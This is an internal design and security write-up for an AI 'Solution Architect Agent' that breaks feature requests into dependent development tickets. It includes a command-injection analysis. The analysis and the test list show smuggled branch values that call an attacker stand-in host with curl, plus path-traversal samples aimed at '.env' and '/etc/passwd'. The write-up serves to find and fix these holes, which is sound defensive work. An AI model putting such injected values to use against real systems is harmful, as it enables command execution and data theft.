# AGENT-011: Solution Architect Agent — Investigation & Implementation Write-up

## 1. Summary & Classification

AGENT-011 defines the Solution Architect Agent type — a configuration profile that plugs into the Worker Agent Framework (AGENT-003) to autonomously decompose feature requests into ordered, dependent development tickets. The agent picks up tickets labeled `type:feature_request`, clones the repository, reads reference documentation (CLAUDE.md, docs/dynamodb.md, docs/file-reference.md), scans configured source directories to understand existing patterns, generates a full technical design (data model, API endpoints, frontend components, E2E test plan) via Claude Code or Codex, breaks the feature into at most N development tickets (default 8, max 20) with complexity estimates and dependency relationships, and links everything in a dedicated `feature_decompositions` DynamoDB table. A design review gate can optionally pause the agent and request human feedback before ticket creation.

- **Type**: Feature (specialized agent type configuration)
- **Priority**: High
- **Status**: Implemented — `app/services/agent_architect.py` (1369 lines), `app/routers/agent_architect.py` (247 lines), frontend `ArchitectAgentConfigPage.tsx` + `ArchitectRunOutputPanel.tsx` + `DependencyGraphView.tsx`, E2E spec `frontend/e2e/agent-architect.spec.ts` (sections 663–666)
- **Owning area**: Agent platform / requirements engineering automation
- **Who is affected**: Product managers and system architects who submit feature requests; Coder Agent (AGENT-008) consumes the generated tickets; Project Manager Agent (AGENT-012) tracks velocity against estimates
- **Cross-references**: SEC-021 (command injection — `repo_url` and `branch` interpolated into `git clone` command; analysis prompt interpolated into `claude` invocation), SECOPS-007 (dev/prod parity — `ARCHITECT_EXECUTE_COMMANDS` gate; dev = in-memory decomposition; prod = real terminal), AGENT-008 (consumes generated tickets via label `type:development` + complexity labels)

---

## 2. Current-State Investigation (what exists today)

### Service layer: `app/services/agent_architect.py` (1369 lines)

**Table bootstrap** (`agent_architect.py:105–148`): `ensure_tables()` calls `coder_svc.ensure_tables()` for the shared `agent_types`/`agent_runs` tables, then creates the `feature_decompositions` table (`S.feature_decompositions_table_name`, default `"feature_decompositions"`) with a GSI named `GSI1` (PK=`GSI1PK:S`, SK=`GSI1SK:N`). The `N` type declaration for `GSI1SK` is present in `AttributeDefinitions`, correctly handling the numeric sort key requirement documented in CLAUDE.md.

**Config validation** (`agent_architect.py:188–232`): `validate_architect_config(config)` enforces:
- `repo_url` required; must start with `https://` or `git@`; no spaces
- `reference_docs` and `scan_paths` cannot be empty lists if explicitly set
- Path traversal prevention: `..` in any `reference_docs` or `scan_paths` entry → error
- `ticket_template` must contain `{subject}` and `{overview}` placeholders
- `max_tickets_per_feature` must be 1–20
- `ticket_spec_style` must be `full` or `compact`

The `..` path traversal check is important — without it, an admin could configure `reference_docs=["../../.env"]` and have the agent read the secrets file.

**Workflow generation** (`agent_architect.py:1122–1200`): `build_architect_workflow()` is pure (no I/O). Builds the analysis prompt via `build_analysis_prompt()` then constructs the coding invocation at line 1144–1148:

```python
if coding_tool == "codex":
    analyze_cmd = f'codex -q "{analysis_prompt[:160]}..."'
else:
    model_flag = f" --model {model}" if model else ""
    analyze_cmd = f'claude --dangerously-skip-permissions{model_flag} -p "{analysis_prompt[:160]}..."'
```

This f-string interpolation is the SEC-021 injection surface for this agent. The analysis prompt contains ticket subject and description (user-controlled text).

The clone command is built at line 1153:
```python
"command": f"git clone --depth 1 -b {branch} {repo_url} /workspace"
```
`repo_url` is admin-configured and passes the `https://` / `git@` prefix check, but `branch` defaults to `"main"` and comes from config without sanitization equivalent to AGENT-008's `generate_branch_name()`. A crafted `repo_branch = "main; echo pwned"` in the config passes the validator (it only checks `repo_url`, not `repo_branch`), making this a latent injection on the `branch` field when `ARCHITECT_EXECUTE_COMMANDS=1`.

The ticket notes this gap in SEC-021: "apply the coder's branch sanitization in architect too."

**Analysis prompt construction** (`agent_architect.py:1050–1120`): `build_analysis_prompt()` assembles:
- Feature request ticket subject and description
- Architecture guidelines from config
- Reference doc paths
- Scan paths
- Tech stack constraints and naming conventions

The prompt is truncated to 160 chars in the workflow display version. The full prompt is stored on the agent_runs META item.

**Ticket decomposition and rendering** (`agent_architect.py:600–800`): `decompose_feature(ticket, config, architect_output)` takes the structured `architect_output` dict (from the LLM's response or mock), creates development tickets via `tickets_svc.STORE.create_ticket()` for each entry, writes `feature_decompositions` link items, and returns the decomposition metadata.

`render_ticket_content(template, placeholders)` at line ~760 substitutes `{subject}`, `{overview}`, `{data_model}`, `{api_design}`, `{frontend_design}`, `{e2e_test_plan}`, `{error_handling}`, `{security}`, `{dependencies}`, and other placeholders. Template rendering is pure string substitution without any templating engine — no injection risk here (the template itself is admin-defined).

**Feature decompositions table** (`agent_architect.py:800–950`): `store_decomposition(feature_ticket_id, dev_tickets, agent_run_id, summary, dependency_graph)` writes:
- One META item at PK `FEATURE#{feature_ticket_id}` / SK `META` with `decomposition_summary`, `total_tickets_created`, `total_estimated_hours`, `dependency_graph` (JSON string), `agent_run_id`, `created_at`
- One DEV item per generated ticket at SK `DEV#{dev_ticket_id}` with `order`, `complexity`, `estimated_hours`, `ticket_type`, `GSI1PK=AGENT_RUN#{run_id}`, `GSI1SK=created_at`

The GSI1 allows querying all decomposition results by run ID.

**Dependency graph** (`agent_architect.py:950–1050`): `build_dependency_graph(tickets)` takes a list of ticket dicts with `depends_on` lists, returns a dict `{ticket_id: [dep_ticket_id, …]}` as a JSON string. `validate_dependency_graph(graph)` checks for cycles using DFS. Cycles in the dependency graph would create an infinite loop for the Coder Agent's work queue, so cycle detection is important.

**Complexity estimation** (`agent_architect.py:1000–1050`): `estimate_complexity_hours(analysis)` uses the `complexity_estimation` map from config (defaulting to `_DEFAULT_COMPLEXITY_ESTIMATION`) to compute effort estimates: new table = 16h, new endpoint = 4h, new page = 12h, modify file = 2h, test section = 8h. The values come from the analysis output's detected counts.

**Execution gate** (`app/core/settings.py:2226`): `S.architect_execute_commands` defaults to `False`. With execution disabled, `build_architect_workflow()` generates steps but the terminal injection and real git/LLM execution is skipped. The decomposition itself is driven by the in-memory mock `architect_output` structure.

**Design review gate** (`agent_architect.py:1200–1280`): When `require_design_review=True`, the workflow includes a `request_design_review` step that stores `design_review_status="pending"` on the run META. The router exposes `POST /ui/agents/runs/{run_id}/design-review/approve` and `/reject`. Like the DevOps approval gate, approval timeout is enforced (`architect_design_review_required` setting at `app/core/settings.py:2221–2225`, default `False`).

### Router: `app/routers/agent_architect.py` (247 lines)

Registered in `app/main.py:771–772`. All under `/ui/agents`, gated by `require_admin_or_root`. Key endpoints:
- `PUT /ui/agents/types/{type_id}/architect-config` — save config (validation called inside service)
- `GET /ui/agents/types/{type_id}/architect-config` — retrieve config
- `POST /ui/agents/types/{type_id}/architect-config/validate` — `{valid, errors}` without saving
- `GET /ui/agents/types/{type_id}/architect-eligible-tickets` — preview eligible feature requests
- `POST /ui/agents/types/{type_id}/test-architect-workflow` — dry-run decomposition
- `GET /ui/agents/runs/{run_id}/architect-output` — structured decomposition output
- `GET /ui/agents/runs/{run_id}/decomposition` — full `DecompositionOut` with dev ticket list
- `GET /ui/agents/runs/{run_id}/dependency-graph` — `DependencyGraphOut` as adjacency dict
- `POST /ui/agents/runs/{run_id}/design-review/approve` — approve design
- `POST /ui/agents/runs/{run_id}/design-review/reject` — reject with reason
- `GET /ui/agents/architect/metrics` — decomposition metrics

### Frontend

`ArchitectAgentConfigPage.tsx` (route `/agents/types/:typeId/architect`) has Config, Eligible Tickets, and Metrics tabs. `DependencyGraphView.tsx` renders the ticket dependency graph as a DAG visualization. `ArchitectRunOutputPanel.tsx` shows the decomposition summary, generated tickets table, and dependency graph.

### E2E spec: `frontend/e2e/agent-architect.spec.ts`

Four sections: 663 (Architect Config API), 664 (Feature Decomposition API), 665 (Dependency Graph & Output API), 666 (Architect Config UI). Run offline with `ARCHITECT_EXECUTE_COMMANDS=0`.

---

## 3. Gap / Threat Analysis

### SEC-021: Command injection on `repo_branch` and analysis prompt

**Branch injection** (`agent_architect.py:1153`):
```python
"command": f"git clone --depth 1 -b {branch} {repo_url} /workspace"
```
`branch` comes from `config.get("repo_branch", "main")` after `_normalize_config()`. `validate_architect_config()` does not validate `repo_branch` at all — only `repo_url` is checked. An admin could set `repo_branch = "main; curl https://attacker.com/$(id)"` and the command string would become:
```
git clone --depth 1 -b main; curl https://attacker.com/$(id) https://... /workspace
```
This is exploitable when `ARCHITECT_EXECUTE_COMMANDS=1`. AGENT-008 avoids this by applying `generate_branch_name()` (which sanitizes to `[a-zA-Z0-9_/\-]`); AGENT-011 lacks equivalent sanitization.

**Analysis prompt injection** (`agent_architect.py:1144–1148`): Same f-string double-quote interpolation as AGENT-008/009. The analysis prompt contains the feature request ticket subject (user-controlled). A subject with `"` breaks the shell argument; one with `$(…)` executes when passed to a shell.

### Path traversal in reference docs / scan paths

`validate_architect_config()` rejects `..` in `reference_docs` and `scan_paths` (line 204, 209). However, the check is `".." in str(path)` — it catches `../foo` but not absolute paths like `/etc/passwd`. An absolute path passed as a `scan_path` would not contain `..` and would pass validation, potentially causing the agent to read arbitrary filesystem paths on the worker.

### `_DEFAULT_COMPLEXITY_ESTIMATION` float values cause DynamoDB Decimal issues

`_DEFAULT_COMPLEXITY_ESTIMATION` uses Python floats (e.g., `4.0`, `12.0`). When stored in DynamoDB, Python floats must be converted to `Decimal`. The service has `_ddb_safe()` (`agent_architect.py:156`) which converts floats to `Decimal(str(value))`. This is called in `_normalize_config()`. However, if a user sends `complexity_estimation={"new_endpoint": 4}` (integer), the `_ddb_safe()` path converts it correctly. If they send `4.1` as a float, the conversion may introduce floating-point representation noise (`Decimal("4.1")`). This is cosmetic but could cause `Decimal('4.100000000000001')` display issues.

### Dependency cycle in generated tickets

If the LLM-produced `depends_on` relationships contain a cycle (e.g., ticket A depends on B, B depends on A), `validate_dependency_graph()` should catch it. However, if the validation is bypassed or the mock output in E2E tests has a cycle, the Coder Agent's ticket queue would loop indefinitely. A guard in `build_dependency_graph()` should always enforce cycle-free invariants regardless of input source.

---

## 4. Proposed Design / Fix

### SEC-021 fix: branch sanitization parity with AGENT-008

Add branch sanitization to `_normalize_config()` in `agent_architect.py`:
```python
def _sanitize_branch(branch: str) -> str:
    """Sanitize branch name to git-safe characters only."""
    import re
    name = re.sub(r"[^a-zA-Z0-9_/.\-]", "-", str(branch or "main"))
    name = re.sub(r"-{2,}", "-", name).strip("-/")
    return name[:100] or "main"

def _normalize_config(config):
    out = ...
    out["repo_branch"] = _sanitize_branch(config.get("repo_branch", "main"))
    ...
```

Also add `repo_branch` validation to `validate_architect_config()`:
```python
branch = config.get("repo_branch", "main")
if branch and not re.match(r'^[a-zA-Z0-9_/.\-]{1,100}$', branch):
    errors.append("repo_branch contains invalid characters")
```

For the analysis prompt injection, apply the same argv approach as recommended for AGENT-008: store the prompt as a structured `argv` field alongside the display `command` string, and execute via `subprocess(argv, shell=False)` when `ARCHITECT_EXECUTE_COMMANDS=1`.

### SEC-021 fix: absolute path rejection in scan paths

Enhance `validate_architect_config()` to also reject absolute paths:
```python
for path in scan_paths or []:
    if ".." in str(path) or str(path).startswith("/"):
        errors.append(f"Scan path must be relative and must not traverse outside repo: {path}")
```

### Decimal float handling

Replace `_DEFAULT_COMPLEXITY_ESTIMATION` floats with `Decimal` instances or change all estimation values to integers (hours are whole-number estimates). Document that `complexity_estimation` values are stored as `Decimal` in DynamoDB.

### Dev/Prod parity (SECOPS-007)

Current parity is correct:
- `S.architect_execute_commands = False` (dev default): `build_architect_workflow()` generates steps; no git clone, no LLM call, no filesystem scan occurs; decomposition runs via in-memory mock `architect_output`.
- Prod (`ARCHITECT_EXECUTE_COMMANDS=1`): real terminal injection via AGENT-002; git clone on worker, real Claude Code analysis.
- `feature_decompositions` table → DDB Local (dev) / AWS DynamoDB (prod): same boto3 code path.
- `tickets_svc.STORE.create_ticket()` for generated tickets → DDB Local / DynamoDB: same code path.
- `architect_design_review_required` flag (`S.architect_design_review_required`): separate from `ARCHITECT_EXECUTE_COMMANDS`; can be enabled in dev without enabling execution.

No changes to the parity design needed.

---

## 5. Testing, Verification & Rollout

### pytest unit tests (`tests/test_agent_architect.py`)

Key test cases:
- `test_validate_config_missing_repo_url`: empty `repo_url` → errors["Repository URL is required"]
- `test_validate_config_ext_transport`: `repo_url="git+https://evil.com"` → must either pass (validate only checks `git@` or `https://` prefix, `git+` passes!) — this reveals a gap: add rejection of `git+` prefix
- `test_validate_config_path_traversal`: `reference_docs=["../../.env"]` → error
- `test_validate_config_absolute_scan_path`: `scan_paths=["/etc/passwd"]` → error (after fix)
- `test_sanitize_branch_injection`: `repo_branch="main; curl evil.com"` → sanitized to `"main-curl-evil-com"` or similar (after fix)
- `test_validate_branch_injection`: config with semicolon in `repo_branch` → `validate_architect_config()` returns error
- `test_build_architect_workflow_step_count`: returns 8+ steps; first `type="clone_repo"`, last `type="create_tickets"`
- `test_dependency_graph_no_cycle`: valid linear dependency chain → `validate_dependency_graph()` returns no errors
- `test_dependency_graph_cycle_detected`: A→B→A cycle → `validate_dependency_graph()` returns ["Dependency cycle detected"]
- `test_decompose_feature_creates_tickets`: mock `architect_output` with 3 dev tickets → `create_ticket()` called 3 times; `feature_decompositions` has 3 DEV items + 1 META
- `test_decompose_feature_respects_max_tickets`: `max_tickets_per_feature=2` with output containing 5 → only 2 tickets created
- `test_render_ticket_content_placeholders`: template with `{subject}` → rendered with ticket subject
- `test_estimate_complexity_hours_basic`: analysis with 1 new table, 2 new endpoints → 16 + 4 * 2 = 24h
- `test_get_architect_metrics_empty`: no completed runs → returns zeros without error

### Playwright E2E

Existing `frontend/e2e/agent-architect.spec.ts` sections 663–666. Key:
- Section 664.1: feature request ticket → `test-architect-workflow` returns steps with `decomposition_summary`
- Section 665.2: dependency graph is valid JSON with `{ticket_id: [dep_ids]}` shape
- Section 666.3: `DependencyGraphView` renders in UI

Run: `cd frontend && npx playwright test e2e/agent-architect.spec.ts`

### Manual QA steps

1. Create an Architect agent type; set config with `repo_url`, `reference_docs=["CLAUDE.md"]`, `scan_paths=["app/services/"]`
2. Create a ticket with `labels=["type:feature_request"]` → verify in `architect-eligible-tickets`
3. Dry-run `test-architect-workflow` → verify steps include `clone_repo`, `read_docs`, `analyze_feature`, `create_tickets`
4. Navigate `/agents/types/{typeId}/architect` → Config tab shows reference docs list, scan paths, template editor
5. `DependencyGraphView` renders a DAG (even for a simple linear chain)
6. Enable `require_design_review=True` → dry-run shows `request_design_review` step; design review endpoints respond

### Rollout

- Ship with `ARCHITECT_EXECUTE_COMMANDS=0` (current default). No prod impact.
- SEC-021 fix (branch sanitization, absolute path rejection, argv for analysis command) before enabling execution.
- `git+` transport rejection needs to be added to `validate_architect_config()`.
- Production readiness: agent worker image must have git, the configured `coding_tool` (claude binary or codex), and read access to the configured repository.

**Effort estimate**: M (service implemented; SEC-021 branch sanitization and absolute-path fix ~0.5 days; `git+` transport fix ~0.2 days; cycle detection hardening ~0.3 days; missing unit tests ~1.5 days).
